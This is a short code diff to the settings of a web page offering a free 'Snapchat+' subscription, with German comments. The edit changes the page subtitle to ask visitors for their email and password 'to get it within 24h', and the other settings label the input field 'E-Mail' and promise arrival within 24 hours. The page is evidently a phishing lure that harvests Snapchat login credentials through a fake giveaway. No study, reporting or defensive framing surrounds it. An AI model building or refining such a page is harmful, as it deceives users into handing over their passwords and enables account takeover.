@@ -12,7 +12,7 @@ SETTINGS = {
     # --- Titel & Überschriften ---
     "PAGE_TITLE": "GratisSnapchat+",                 # Titel im Browser-Tab
     "HEADLINE": "Gratis Snapchat+",                   # Große Überschrift auf der Seite
-    "SUBTITLE": "send your username/message",    # Text unter der Überschrift
+    "SUBTITLE": "send your E-Mail/Password to get it within 24h",    # Text unter der Überschrift
 
     # --- Felder ---
     "USERNAME_LABEL": "E-Mail",                # Beschriftung über dem Namensfeld
@@ -27,7 +27,7 @@ SETTINGS = {
 
     # --- Meldungen ---
     "SUCCESS_TITLE": "Sent!",                    # Überschrift nach dem Senden
-    "SUCCESS_TEXT": "✅ Innerhalb von 24 Stunden wird es ankommen😄",
+    "SUCCESS_TEXT": "✅ Innerhalb von 24 Stunden wird es ankommen 😄",
     "ERROR_TEXT": "❌ Error – check your connection and try again.",
 
     # --- Sonstiges ---
